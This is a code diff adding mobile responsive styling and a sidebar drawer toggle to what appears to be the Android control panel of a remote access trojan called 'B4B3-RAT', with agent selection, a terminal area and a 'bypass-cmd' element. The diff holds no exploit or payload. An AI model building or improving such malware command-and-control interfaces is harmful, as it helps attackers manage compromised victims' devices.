@@ -84,10 +84,33 @@ code{background:var(--bg);border:1px solid var(--bg3);border-radius:4px;padding:
 .res-time{color:var(--muted);font-size:10px;margin-bottom:2px}
 .auto-row{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--muted)}
 .auto-row input{accent-color:var(--accent)}
+
+/* ── mobile ────────────────────────────────────────────────────────────── */
+.menu-btn{display:none;background:none;border:none;color:var(--accent);font-size:22px;cursor:pointer;padding:0 4px;line-height:1;flex-shrink:0}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:99}
+.overlay.on{display:block}
+@media(max-width:700px){
+  .menu-btn{display:block}
+  .sidebar{position:fixed;left:-270px;top:52px;bottom:0;z-index:100;transition:left .22s;border-right:none;box-shadow:none}
+  .sidebar.open{left:0;box-shadow:6px 0 24px rgba(0,0,0,.6)}
+  .layout{overflow:visible}
+  .panel{padding:10px 12px}
+  .card{padding:12px;border-radius:9px}
+  .term-wrap{height:200px}
+  .info-grid{grid-template-columns:1fr 1fr}
+  .bypass-cmd{font-size:9.5px}
+  pre{font-size:9.5px;overflow-x:auto}
+  header{padding:0 10px;gap:6px}
+  .form-row input{font-size:12px;padding:7px 10px}
+  .auto-row .btn{font-size:10px;padding:4px 7px}
+  #last-refresh{display:none}
+  .step{font-size:11px}
+}
 </style>
 </head>
 <body>
 <header>
+  <button class="menu-btn" onclick="toggleSidebar()" aria-label="Menu">&#9776;</button>
   <div class="logo"><a href="index.html">◀ B4B3-RAT</a> / 📱 Android</div>
   <div class="spacer"></div>
   <div class="auto-row">
@@ -98,6 +121,7 @@ code{background:var(--bg);border:1px solid var(--bg3);border-radius:4px;padding:
   </div>
 </header>
 
+<div class="overlay" id="overlay" onclick="closeSidebar()"></div>
 <div class="layout">
   <!-- ── sidebar ── -->
   <div class="sidebar">
@@ -769,6 +793,25 @@ function timeAgo(ts){
 }
 function fmt(ts){ return ts?new Date(ts).toLocaleString():'—'; }
 function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+// ── SIDEBAR TOGGLE (mobile drawer) ────────────────────────────────────────────
+function toggleSidebar(){
+  const sb = document.querySelector('.sidebar');
+  const ov = document.getElementById('overlay');
+  const nowOpen = sb.classList.toggle('open');
+  if(nowOpen) ov.classList.add('on'); else ov.classList.remove('on');
+}
+function closeSidebar(){
+  document.querySelector('.sidebar')?.classList.remove('open');
+  document.getElementById('overlay')?.classList.remove('on');
+}
+
+// Patch selectAgent so tapping on mobile auto-closes the drawer
+const _origSelect = selectAgent;
+selectAgent = function(jsonStr){
+  if(window.innerWidth<=700) closeSidebar();
+  _origSelect(jsonStr);
+};
 
 // ── AUTO-REFRESH ──────────────────────────────────────────────────────────────
 loadAgents();
